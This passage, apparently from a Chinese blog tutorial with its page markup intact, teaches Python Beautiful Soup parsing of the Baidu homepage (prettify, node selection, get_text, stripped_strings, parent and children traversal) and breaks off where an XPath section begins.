class="string">"s_form_wrapper"</span>&gt;</span> <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"lg"</span>&gt;</span> <span class="tag">&lt;<span class="name">img</span> <span class="attr">height</span>=<span class="string">"129"</span> <span class="attr">hidefocus</span>=<span class="string">"true"</span> <span class="attr">src</span>=<span class="string">"//www.baidu.com/img/bd_logo1.png"</span> <span class="attr">width</span>=<span class="string">"270"</span>/&gt;</span> <span class="tag">&lt;/<span class="name">div</span>&gt;</span> <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"//www.baidu.com/s"</span> <span class="attr">class</span>=<span class="string">"fm"</span> <span class="attr">id</span>=<span class="string">"form"</span> <span class="attr">name</span>=<span class="string">"f"</span>&gt;</span> <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"bdorz_come"</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">value</span>=<span class="string">"1"</span>/&gt;</span> <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"ie"</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">value</span>=<span class="string">"utf-8"</span>/&gt;</span> <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"f"</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">value</span>=<span class="string">"8"</span>/&gt;</span> <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"rsv_bp"</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">value</span>=<span class="string">"1"</span>/&gt;</span> <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"rsv_idx"</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">value</span>=<span class="string">"1"</span>/&gt;</span> <span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"tn"</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">value</span>=<span class="string">"baidu"</span>/&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"bg s_ipt_wr"</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">autocomplete</span>=<span class="string">"off"</span> <span class="attr">autofocus</span>=<span class="string">"autofocus"</span> <span class="attr">class</span>=<span class="string">"s_ipt"</span> <span class="attr">id</span>=<span class="string">"kw"</span> <span class="attr">maxlength</span>=<span class="string">"255"</span> <span class="attr">name</span>=<span class="string">"wd"</span> <span class="attr">value</span>=<span class="string">""</span>/&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"bg s_btn_wr"</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">autofocus</span>=<span class="string">""</span> <span class="attr">class</span>=<span class="string">"bg s_btn"</span> <span class="attr">id</span>=<span class="string">"su"</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"百度一下"</span>/&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span> <span class="tag">&lt;/<span class="name">form</span>&gt;</span> <span class="tag">&lt;/<span class="name">div</span>&gt;</span> <span class="tag">&lt;/<span class="name">div</span>&gt;</span> <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"u1"</span>&gt;</span> <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"mnav"</span> <span class="attr">href</span>=<span class="string">"http://news.baidu.com"</span> <span class="attr">name</span>=<span class="string">"tj_trnews"</span>&gt;</span>新闻<span class="tag">&lt;/<span class="name">a</span>&gt;</span> <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"mnav"</span> <span class="attr">href</span>=<span class="string">"https://www.hao123.com"</span> <span class="attr">name</span>=<span class="string">"tj_trhao123"</span>&gt;</span>hao123<span class="tag">&lt;/<span class="name">a</span>&gt;</span> <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"mnav"</span> <span class="attr">href</span>=<span class="string">"http://map.baidu.com"</span> <span class="attr">name</span>=<span class="string">"tj_trmap"</span>&gt;</span>地图<span class="tag">&lt;/<span class="name">a</span>&gt;</span> <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"mnav"</span> <span class="attr">href</span>=<span class="string">"http://v.baidu.com"</span> <span class="attr">name</span>=<span class="string">"tj_trvideo"</span>&gt;</span>视频<span class="tag">&lt;/<span class="name">a</span>&gt;</span> <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"mnav"</span> <span class="attr">href</span>=<span class="string">"http://tieba.baidu.com"</span> <span class="attr">name</span>=<span class="string">"tj_trtieba"</span>&gt;</span>贴吧<span class="tag">&lt;/<span class="name">a</span>&gt;</span> <span class="tag">&lt;<span class="name">noscript</span>&gt;</span> <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"lb"</span> <span class="attr">href</span>=<span class="string">"http://www.baidu.com/bdorz/login.gif?login&amp;amp;tpl=mn&amp;amp;u=http%3A%2F%2Fwww.baidu.com%2f%3fbdorz_come%3d1"</span> <span class="attr">name</span>=<span class="string">"tj_login"</span>&gt;</span>登录<span class="tag">&lt;/<span class="name">a</span>&gt;</span> <span class="tag">&lt;/<span class="name">noscript</span>&gt;</span> <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">document</span>.write(<span class="string">'&lt;a href="http://www.baidu.com/bdorz/login.gif?login&amp;tpl=mn&amp;u='</span>+ <span class="built_in">encodeURIComponent</span>(<span class="built_in">window</span>.location.href+ (<span class="built_in">window</span>.location.search === <span class="string">""</span> ? <span class="string">"?"</span> : <span class="string">"&amp;"</span>)+ <span class="string">"bdorz_come=1"</span>)+ <span class="string">'" name="tj_login" class="lb"&gt;登录&lt;/a&gt;'</span>);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">                </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"bri"</span> <span class="attr">href</span>=<span class="string">"//www.baidu.com/more/"</span> <span class="attr">name</span>=<span class="string">"tj_briicon"</span> <span class="attr">style</span>=<span class="string">"display: block;"</span>&gt;</span>更多产品<span class="tag">&lt;/<span class="name">a</span>&gt;</span> <span class="tag">&lt;/<span class="name">div</span>&gt;</span> <span class="tag">&lt;/<span class="name">div</span>&gt;</span> <span class="tag">&lt;/<span class="name">div</span>&gt;</span> <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"ftCon"</span>&gt;</span> <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"ftConw"</span>&gt;</span> <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"lh"</span>&gt;</span> <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://home.baidu.com"</span>&gt;</span>关于百度<span class="tag">&lt;/<span class="name">a</span>&gt;</span> <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://ir.baidu.com"</span>&gt;</span>About Baidu<span class="tag">&lt;/<span class="name">a</span>&gt;</span> <span class="tag">&lt;/<span class="name">p</span>&gt;</span> <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"cp"</span>&gt;</span>©2017 Baidu <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://www.baidu.com/duty/"</span>&gt;</span>使用百度前必读<span class="tag">&lt;/<span class="name">a</span>&gt;</span>  <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"cp-feedback"</span> <span class="attr">href</span>=<span class="string">"http://jianyi.baidu.com/"</span>&gt;</span>意见反馈<span class="tag">&lt;/<span class="name">a</span>&gt;</span> 京ICP证030173号  <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"//www.baidu.com/img/gs.gif"</span>/&gt;</span> <span class="tag">&lt;/<span class="name">p</span>&gt;</span> <span class="tag">&lt;/<span class="name">div</span>&gt;</span> <span class="tag">&lt;/<span class="name">div</span>&gt;</span> <span class="tag">&lt;/<span class="name">div</span>&gt;</span> <span class="tag">&lt;/<span class="name">body</span>&gt;</span> <span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>从上述代码中，我们可以看见打印出的内容有点过于杂乱无章，为了使得解析后的页面清洗直观，我们可以使用<code>prettify()</code>方法来对其进行标准的缩进操作，为了方便讲解，博主对结果进行适当的删除，只留下有价值的内容，源码及输出如下：</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bd_soup = BeautifulSoup(<span class="name">response</span>.text, <span class="string">"lxml"</span>)</span><br><span class="line">print(<span class="name">bd_soup</span>.prettify())</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span></span><br><span class="line">   百度一下，你就知道</span><br><span class="line">  <span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">body</span> <span class="attr">link</span>=<span class="string">"#0000cc"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"wrapper"</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"head"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"head_wrapper"</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"s_form"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"s_form_wrapper"</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"lg"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">img</span> <span class="attr">height</span>=<span class="string">"129"</span> <span class="attr">hidefocus</span>=<span class="string">"true"</span> <span class="attr">src</span>=<span class="string">"//www.baidu.com/img/bd_logo1.png"</span> <span class="attr">width</span>=<span class="string">"270"</span>/&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"u1"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"mnav"</span> <span class="attr">href</span>=<span class="string">"http://news.baidu.com"</span> <span class="attr">name</span>=<span class="string">"tj_trnews"</span>&gt;</span></span><br><span class="line">       新闻</span><br><span class="line">      <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"mnav"</span> <span class="attr">href</span>=<span class="string">"https://www.hao123.com"</span> <span class="attr">name</span>=<span class="string">"tj_trhao123"</span>&gt;</span></span><br><span class="line">       hao123</span><br><span class="line">      <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"mnav"</span> <span class="attr">href</span>=<span class="string">"http://map.baidu.com"</span> <span class="attr">name</span>=<span class="string">"tj_trmap"</span>&gt;</span></span><br><span class="line">       地图</span><br><span class="line">      <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"mnav"</span> <span class="attr">href</span>=<span class="string">"http://v.baidu.com"</span> <span class="attr">name</span>=<span class="string">"tj_trvideo"</span>&gt;</span></span><br><span class="line">       视频</span><br><span class="line">      <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"mnav"</span> <span class="attr">href</span>=<span class="string">"http://tieba.baidu.com"</span> <span class="attr">name</span>=<span class="string">"tj_trtieba"</span>&gt;</span></span><br><span class="line">       贴吧</span><br><span class="line">      <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"bri"</span> <span class="attr">href</span>=<span class="string">"//www.baidu.com/more/"</span> <span class="attr">name</span>=<span class="string">"tj_briicon"</span> <span class="attr">style</span>=<span class="string">"display: block;"</span>&gt;</span></span><br><span class="line">       更多产品</span><br><span class="line">      <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"ftCon"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"ftConw"</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"lh"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://home.baidu.com"</span>&gt;</span></span><br><span class="line">       关于百度</span><br><span class="line">      <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://ir.baidu.com"</span>&gt;</span></span><br><span class="line">       About Baidu</span><br><span class="line">      <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"cp"</span>&gt;</span></span><br><span class="line">      ©2017 Baidu</span><br><span class="line">      <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://www.baidu.com/duty/"</span>&gt;</span></span><br><span class="line">       使用百度前必读</span><br><span class="line">      <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"cp-feedback"</span> <span class="attr">href</span>=<span class="string">"http://jianyi.baidu.com/"</span>&gt;</span></span><br><span class="line">       意见反馈</span><br><span class="line">      <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">      京ICP证030173号</span><br><span class="line">      <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"//www.baidu.com/img/gs.gif"</span>/&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="节点选择"><a href="#节点选择" class="headerlink" title="节点选择"></a>节点选择</h3><p>在Beautiful Soup中，我们可以很方便的选择想要得到的节点，只需要在<code>bd_soup</code>对象中使用<code>.</code>的方式即可，使用如下：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">bd_title_bj = bd_soup.title</span><br><span class="line">bd_title_bj_name = bd_soup<span class="selector-class">.title</span><span class="selector-class">.name</span></span><br><span class="line">bd_title_name = bd_soup<span class="selector-class">.title</span><span class="selector-class">.string</span></span><br><span class="line">bd_title_parent_bj_name = bd_soup<span class="selector-class">.title</span><span class="selector-class">.parent</span><span class="selector-class">.name</span></span><br><span class="line">bd_image_bj = bd_soup.img</span><br><span class="line">bd_image_bj_dic = bd_soup<span class="selector-class">.img</span><span class="selector-class">.attrs</span></span><br><span class="line">bd_image_all = bd_soup.find_all(<span class="string">"img"</span>)</span><br><span class="line">bd_image_idlg = bd_soup.find(<span class="string">"div"</span>, id=<span class="string">"lg"</span>)</span><br></pre></td></tr></table></figure><p>代码解读：</p><ul><li><code>bd_soup.title</code>，正如前面所说，Beautiful Soup可以很简单的解析对应的页面，只需要使用<code>bd_soup.</code>的方式进行选择节点即可，该行代码正是获得百度首页html的<code>title</code>节点内容</li><li><code>bd_soup.title.name</code>，使用<code>.name</code>的形式即可获取节点的名称</li><li>bd_soup.title.string，使用<code>.string</code>的形式即可获得节点当中的内容，这句代码就是获取百度首页的title节点的内容，即浏览器导航条中所显示的<code>百度一下，你就知道</code></li><li><code>bd_soup.title.parent.name</code>，使用<code>.parent</code>可以该节点的父节点，通俗地讲就是该节点所对应的上一层节点，然后使用<code>.name</code>获取父节点名称</li><li><code>bd_soup.img</code>，如<code>bd_soup.title</code>一样，该代码获取的是<code>img</code>节点，只不过需要注意的是：在上面html中我们可以看见总共有两个<code>img</code>节点，而如果使用<code>.img</code>的话默认是获取html中的第一个<code>img</code>节点，而不是所有</li><li><code>bd_soup.img.attrs</code>，获取<code>img</code>节点中所有的属性及属性内容，该代码输出的结果是一个键值对的字典格式，所以之后我们只需要通过字典的操作来获取属性所对应的内容即可。比如<code>bd_soup.img.attrs.get(&quot;src&quot;)</code>和<code>bd_soup.img.attrs[&quot;src&quot;]</code>的方式来获取<code>img</code>节点所对应的<code>src</code>属性的内容，即图片链接</li><li><code>bd_soup.find_all(&quot;img&quot;)</code>，在上述中的<code>.img</code>操作默认只能获取第一个<code>img</code>节点，而要想获取html中所有的<code>img</code>节点，我们需要使用<code>.find_all(&quot;img&quot;)</code>方法，所返回的是一个列表格式，列表内容为所有的选择的节点</li><li><code>bd_soup.find(&quot;div&quot;, id=&quot;lg&quot;)</code>，在实际运用中，我们往往会选择指定的节点，这个时候我们可以使用<code>.find()</code>方法，里面可传入所需查找节点的属性，这里需要注意的是：在传入<code>class</code>属性的时候其中的写法是<code>.find(&quot;div&quot;, class_=&quot;XXX&quot;)</code>的方式。所以该行代码表示的是获取<code>id</code>属性为<code>lg</code>的<code>div</code>节点，此外，在上面的<code>.find_all()</code>同样可以使用该方法来获取指定属性所对应的所有节点</li></ul><p>上述代码中解析的结果对应打印如下：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;title&gt;百度一下，你就知道&lt;/title&gt;</span><br><span class="line">title</span><br><span class="line">百度一下，你就知道</span><br><span class="line">head</span><br><span class="line">&lt;<span class="selector-tag">img</span> <span class="attribute">height</span>=<span class="string">"129"</span> hidefocus=<span class="string">"true"</span> src=<span class="string">"//www.baidu.com/img/bd_logo1.png"</span> width=<span class="string">"270"</span>/&gt;</span><br><span class="line">&#123;<span class="string">'hidefocus'</span>: <span class="string">'true'</span>, <span class="string">'src'</span>: <span class="string">'//www.baidu.com/img/bd_logo1.png'</span>, <span class="string">'width'</span>: <span class="string">'270'</span>, <span class="string">'height'</span>: <span class="string">'129'</span>&#125;</span><br><span class="line">[&lt;<span class="selector-tag">img</span> <span class="attribute">height</span>=<span class="string">"129"</span> hidefocus=<span class="string">"true"</span> src=<span class="string">"//www.baidu.com/img/bd_logo1.png"</span> width=<span class="string">"270"</span>/&gt;, &lt;img src=<span class="string">"//www.baidu.com/img/gs.gif"</span>/&gt;]</span><br><span class="line">&lt;<span class="selector-tag">div</span> id=<span class="string">"lg"</span>&gt; &lt;<span class="selector-tag">img</span> <span class="attribute">height</span>=<span class="string">"129"</span> hidefocus=<span class="string">"true"</span> src=<span class="string">"//www.baidu.com/img/bd_logo1.png"</span> width=<span class="string">"270"</span>/&gt; &lt;/div&gt;</span><br></pre></td></tr></table></figure><h3 id="数据提取"><a href="#数据提取" class="headerlink" title="数据提取"></a>数据提取</h3><p>在上一小节节点选择我们讲到了部分数据提取的方法，然而，Beautiful Soup的强大之处还不止步于此。接下来我们继续揭开其神秘的面纱。</p><h4 id="get-text"><a href="#get-text" class="headerlink" title=".get_text()"></a>.get_text()</h4><p>获取对象中所有的内容：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">all_content</span> = bd_soup.get_text()</span><br></pre></td></tr></table></figure><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">百度一下，你就知道                     新闻 hao123 地图 视频 贴吧  登录  document.<span class="built_in">write</span>('&lt;a href=<span class="string">"http://www.baidu.com/bdorz/login.gif?login&amp;tpl=mn&amp;u='+ encodeURIComponent(window.location.href+ (window.location.search === "</span><span class="string">" ? "</span>?<span class="string">" : "</span>&amp;<span class="string">")+ "</span>bdorz_come=<span class="number">1</span><span class="string">")+ '"</span> <span class="built_in">name</span>=<span class="string">"tj_login"</span> <span class="built_in">class</span>=<span class="string">"lb"</span>&gt;登录&lt;/a&gt;');</span><br><span class="line"></span><br><span class="line">                更多产品       关于百度 About Baidu  ©<span class="number">2017</span> Baidu 使用百度前必读  意见反馈 京ICP证<span class="number">030173</span>号</span><br></pre></td></tr></table></figure><h4 id="strings，-stripped-strings"><a href="#strings，-stripped-strings" class="headerlink" title=".strings，.stripped_strings"></a>.strings，.stripped_strings</h4><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print(<span class="name">type</span>(<span class="name">bd_soup</span>.strings))</span><br><span class="line"># &lt;class 'generator'&gt;</span><br></pre></td></tr></table></figure><p><code>.strings</code>用于提取<code>bd_soup</code>对象中所有的内容，而从上面的输出结果我们可以看出<code>.strings</code>的类型是一个生成器，对此可以使用循环来提取出其中的内容。但是我们在使用<code>.strings</code>的过程中会发现提取出来的内容有很多的空格以及换行，对此我们可以使用<code>.stripped_strings</code>方法来解决该问题，用法如下：</p><figure class="highlight golo"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> <span class="keyword">each</span> <span class="keyword">in</span> bd_soup.stripped_strings:</span><br><span class="line">    <span class="keyword">print</span>(<span class="keyword">each</span>)</span><br></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">百度一下，你就知道</span><br><span class="line">新闻</span><br><span class="line"><span class="symbol">hao123</span></span><br><span class="line">地图</span><br><span class="line">视频</span><br><span class="line">贴吧</span><br><span class="line">登录</span><br><span class="line">更多产品</span><br><span class="line">关于百度</span><br><span class="line"><span class="symbol">About</span> <span class="keyword">Baidu</span></span><br><span class="line"><span class="keyword">©2017 </span><span class="keyword">Baidu</span></span><br><span class="line"><span class="keyword">使用百度前必读</span></span><br><span class="line"><span class="keyword">意见反馈</span></span><br><span class="line"><span class="keyword">京ICP证030173号</span></span><br></pre></td></tr></table></figure><h4 id="parent，-children，-parents"><a href="#parent，-children，-parents" class="headerlink" title=".parent，.children，.parents"></a>.parent，.children，.parents</h4><p><code>.parent</code>可以选择该节点的父节点，<code>.children</code>可以选择该节点的孩子节点，<code>.parents</code>选择该节点所有的上层节店，返回的是生成器，各用法如下：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">bd_div_bj = bd_soup.<span class="builtin-name">find</span>(<span class="string">"div"</span>, <span class="attribute">id</span>=<span class="string">"u1"</span>)</span><br><span class="line"><span class="builtin-name">print</span>(type(bd_div_bj.parent))</span><br><span class="line"><span class="builtin-name">print</span>(<span class="string">"*"</span> * 50)</span><br><span class="line"><span class="keyword">for</span> child <span class="keyword">in</span> bd_div_bj.children:</span><br><span class="line"><span class="builtin-name">print</span>(child)</span><br><span class="line"><span class="builtin-name">print</span>(<span class="string">"*"</span> * 50)</span><br><span class="line"><span class="keyword">for</span> parent <span class="keyword">in</span> bd_div_bj.parents:</span><br><span class="line"><span class="builtin-name">print</span>(parent.name)</span><br></pre></td></tr></table></figure><p>结果输出：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="built_in">class</span> 'bs4.element.Tag'&gt;</span><br><span class="line">**************************************************</span><br><span class="line"> </span><br><span class="line">&lt;a <span class="built_in">class</span>=<span class="string">"mnav"</span> href=<span class="string">"http://news.baidu.com"</span> <span class="built_in">name</span>=<span class="string">"tj_trnews"</span>&gt;新闻&lt;/a&gt;</span><br><span class="line"> </span><br><span class="line">&lt;a <span class="built_in">class</span>=<span class="string">"mnav"</span> href=<span class="string">"https://www.hao123.com"</span> <span class="built_in">name</span>=<span class="string">"tj_trhao123"</span>&gt;hao123&lt;/a&gt;</span><br><span class="line"> </span><br><span class="line">&lt;a <span class="built_in">class</span>=<span class="string">"mnav"</span> href=<span class="string">"http://map.baidu.com"</span> <span class="built_in">name</span>=<span class="string">"tj_trmap"</span>&gt;地图&lt;/a&gt;</span><br><span class="line"> </span><br><span class="line">&lt;a <span class="built_in">class</span>=<span class="string">"mnav"</span> href=<span class="string">"http://v.baidu.com"</span> <span class="built_in">name</span>=<span class="string">"tj_trvideo"</span>&gt;视频&lt;/a&gt;</span><br><span class="line">    </span><br><span class="line">&lt;a <span class="built_in">class</span>=<span class="string">"mnav"</span> href=<span class="string">"http://tieba.baidu.com"</span> <span class="built_in">name</span>=<span class="string">"tj_trtieba"</span>&gt;贴吧&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">**************************************************</span><br><span class="line"><span class="keyword">div</span></span><br><span class="line"><span class="keyword">div</span></span><br><span class="line"><span class="keyword">div</span></span><br><span class="line">body</span><br><span class="line">html</span><br></pre></td></tr></table></figure><h3 id="Beautiful-Soup小结"><a href="#Beautiful-Soup小结" class="headerlink" title="Beautiful Soup小结"></a>Beautiful Soup小结</h3><p>Beautiful Soup主要的用法就是以上一些，还有其他一些操作在实际开发过程中使用的不多，这里不做过多的讲解了，所以整体来讲Beautiful Soup的使用还是比较简单的，其他一些操作可见官方文档：<a href="https://www.crummy.com/software/BeautifulSoup/bs4/doc/index.zh.html#contents-children" target="_blank" rel="noopener">https://www.crummy.com/software/BeautifulSoup/bs4/doc/index.zh.html#contents-children</a></p><h2 id="XPath"><a 